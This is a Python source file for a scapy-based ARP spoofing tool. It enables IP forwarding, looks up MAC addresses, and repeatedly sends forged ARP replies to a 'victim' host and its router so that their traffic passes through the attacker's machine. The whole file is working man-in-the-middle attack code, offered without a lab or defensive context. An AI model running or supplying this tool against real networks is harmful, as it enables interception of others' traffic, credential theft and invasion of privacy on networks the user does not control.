import scapy.all as scapy
import time
from subprocess import call

class ARPspoof:
    def __init__(self, target, router, ip_forward = True):

        """
        DOCSTRING:  this function initalizes the APR spoof class
        target:     this is the IP address of the victim (a string)
        router:     this is the IP address of the router (a string)
        ip_forward: usualy linux doesnt allow packets to flow through it. we need to allow ip forwarding to supply
                    internet connection to the victims machine (is a boolean)
        """

        self.target = str(target)
        self.router = str(router)
        self.ip_forward = bool(ip_forward)

        self.__terminate = False
        self.__sleep = 1

        if ip_forward:
            call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


    def request_mac(self, ip):

        """
        DOCSTRING: this function will create a ARP request to broadcast ans ask the MAC address of a given IP
        ip:        ip is the IP address of the machine which we need the MAC (a string)
        return:    the mac address of the machine (a string)
        """
        # create a ARP packet using scapy
        arp_packet = scapy.ARP(pdst = ip) # creating a arp request to ask the mac of a ip
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

        arp_req_broadcast =  broadcast / arp_packet
        answers = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]

        return answers[0][1].hwsrc

    def send_arp_packet(self, target, source):

        """
        DOCSTRING: this function will create and send an ARP response to spoof one side (single side)
        target:    the ip of the target (a string)
        source:    the ip of the source (a string)
        """
        try:
            packet = scapy.ARP(
                op    = 2,                          # we need to create a ARP response, not a request
                pdst  = target,                     # the ip address of the victims machine
                hwdst = self.request_mac(target),   # the mac address of the victims machine
                psrc  = source                      # the ip address of the router
            )

            scapy.send(packet)     # send the created packet to the network
            print(f"ARP response sent from {source} to {target}")
        
        except IndexError:
            print(f"Could not find the MAC address of the given ip - {target}")
            exit()

        

    
    def run(self):

        try:
            while True:
                self.send_arp_packet(self.router, self.target)
                self.send_arp_packet(self.target, self.router)
                time.sleep(self.__sleep)
        
        except KeyboardInterrupt:
            print("ARP spoof terminating....")
            exit()

        except Exception as err:
            print("Unknown error occured. Program quitting")
            print(f"Error - {err}")